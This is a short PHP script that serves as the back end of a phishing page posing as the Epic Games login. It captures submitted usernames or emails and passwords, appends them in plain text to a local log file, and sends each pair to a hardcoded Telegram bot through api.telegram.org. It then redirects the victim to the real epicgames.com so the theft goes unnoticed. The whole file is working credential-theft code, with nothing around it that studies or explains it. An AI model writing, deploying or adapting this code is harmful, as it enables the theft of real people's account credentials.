<?php
$username = $_POST['username'] ?? $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// Log locally
file_put_contents('logs.txt', "[" . date('Y-m-d H:i:s') . "] $username:$password\n", FILE_APPEND);

// Telegram
$botToken = '8677688801:AAF69bDnyAZAYjDp_q9VRsd3HeHygMHsv5Q';
$chatId = '8782414005';
$msg = "Epic Login\nUser: $username\nPass: $password";
file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($msg));

header('Location: https://www.epicgames.com/');
exit;
?>